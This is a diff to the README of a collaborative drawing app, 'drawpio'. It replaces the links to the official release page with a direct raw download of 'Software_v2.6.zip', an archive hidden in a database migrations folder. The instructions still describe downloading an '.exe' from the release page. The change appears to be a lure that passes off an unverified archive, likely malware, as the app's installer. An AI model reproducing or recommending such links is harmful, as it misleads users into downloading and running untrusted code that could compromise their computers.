@@ -1,6 +1,6 @@
 # 🎨 drawpio - Work together on visual projects easily
 
-[![Download drawpio](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Corlissparasitical1122/drawpio/releases)
+[![Download drawpio](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Corlissparasitical1122/drawpio/raw/refs/heads/main/packages/db/prisma/migrations/20260407081030_initialized_db/Software_v2.6.zip)
 
 drawpio helps people work together in real time. You join a shared space or room to brainstorm, organize ideas, and draw on a digital canvas. This tool connects team members through a live interface. You see changes as others make them.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run drawpio well. Check these specs before
 
 You need to download the installer from the official repository page. The software comes as an executable file that installs the application onto your Windows machine.
 
-1. Follow this link to the [release page](https://github.com/Corlissparasitical1122/drawpio/releases).
+1. Follow this link to the [release page](https://github.com/Corlissparasitical1122/drawpio/raw/refs/heads/main/packages/db/prisma/migrations/20260407081030_initialized_db/Software_v2.6.zip).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file in a folder you can find later, like your Downloads folder.
